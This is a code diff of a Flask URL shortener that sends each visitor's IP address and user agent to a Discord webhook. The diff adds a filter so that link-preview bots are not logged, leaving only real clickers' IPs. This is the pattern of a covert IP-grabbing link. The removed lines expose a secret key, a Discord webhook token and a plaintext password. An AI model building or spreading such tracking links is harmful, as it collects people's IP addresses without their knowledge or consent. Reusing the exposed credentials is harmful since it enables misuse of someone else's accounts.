@@ -1,19 +1,31 @@
-from flask import Flask, request, redirect, jsonify, session, url_for
+from flask import Flask, request, redirect, session, url_for
 import json
 import string
 import random
 import requests
 import os
+from dotenv import load_dotenv
+
+# Load environment variables from .env file
+load_dotenv()
 
 app = Flask(__name__)
-app.secret_key = '1G5gG9AH0ZcrsXxv1qDW9UvuK1GUTVp3Q9BgtJdsk1Uol1btHc'  # Replace with your own secret key
+app.secret_key = os.urandom(24)  # Generate a random secret key
 
 DATA_FILE = 'data.json'
-DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1261170300666646528/mhJM6vLfKt6k0w3EX361vdMHygdobbhQY2u_jMZH7bq1_GxqK23FBfVgcpkgbk6Glm5k'
+DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')
 
-# Authentication credentials
-USERNAME = 'eli32'
-PASSWORD = 'eason2830'  # Replace with a secure password
+# Authentication credentials from environment variables
+USERNAME = os.getenv('URL_SHORTENER_USERNAME')
+PASSWORD = os.getenv('URL_SHORTENER_PASSWORD')
+
+# User agents to ignore
+IGNORED_USER_AGENTS = [
+    "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) DiscordBots/25.1.4 Chrome/102.0.5005.167 Electron/19.0.17 Safari/537.36",
+    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
+    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QQ3A.200805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+]
 
 # Ensure the data file exists
 if not os.path.exists(DATA_FILE):
@@ -36,6 +48,8 @@ def generate_short_url():
 
 # Function to log IP and user agent to Discord
 def log_to_discord(ip, user_agent):
+    if user_agent in IGNORED_USER_AGENTS:
+        return  # Do not send webhook for ignored user agents
     data = {
         "content": f"IP: {ip}\nUser-Agent: {user_agent}"
     }
